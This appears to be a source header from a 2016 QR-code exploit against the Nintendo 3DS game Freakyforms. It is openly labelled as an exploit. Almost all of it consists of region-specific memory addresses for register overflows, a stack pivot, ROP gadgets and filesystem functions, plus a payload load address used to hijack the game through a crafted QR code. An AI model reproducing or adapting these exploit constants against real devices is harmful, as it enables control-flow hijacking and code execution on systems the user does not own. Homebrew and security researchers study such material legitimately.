/* freakyforms qr code exploit. */
/* plutoo 2016 */
#include "macros.h"

REGION_CONST(QR_BUF_ADDR, 0x23F4F8 + 680*4, 0x23E4E8 + 680*4);
REGION_CONST(GAME_CODEBIN_SIZE, 0x130000, 0x105000);

REGION_CONST(R0_OVERFLOW, 0x001a29a0, 0x001a26d0);
REGION_CONST(R5_OVERFLOW, 0xf82c07a4 + 8, 0xf82bf794 + 8);
REGION_CONST(R6_OVERFLOW, 0x00157d24, 0x00157be4);
REGION_CONST(R7_OVERFLOW, 0x01250118, 0x0124f108);
REGION_CONST(STACK_PIVOT, 0x001005e8, 0x001005e8);

/* Rop gadgets. */
REGION_CONST(GADGET_NOP, 0x001536f8, 0x1536d0);
REGION_CONST(GADGET_R0, 0x1004dc, 0x1004dc);
REGION_CONST(GADGET_R1, 0x0019ff50, 0x19fcd4);
REGION_CONST(GADGET_R2R3R4R5R6, 0x001f9728, 0x1f9384);
REGION_CONST(GADGET_ADD_SP_20_POP_R4, 0x0010b97c, 0x10b958);

/* FS functions. */
REGION_CONST(FS_U_HANDLE, 0x00222410, 0x00221410);
REGION_CONST(FS_OPEN_FILE, 0x17c8ac, 0x17c720);
REGION_CONST(FS_OPEN_FILE_DIRECTLY, 0x1dad5c, 0x1da9b8);
REGION_CONST(FS_READ_FILE, 0x117064, 0x11703c);

GLOBAL_CONST(BLOCKBIN_LOAD_ADDR, 0x14100000);
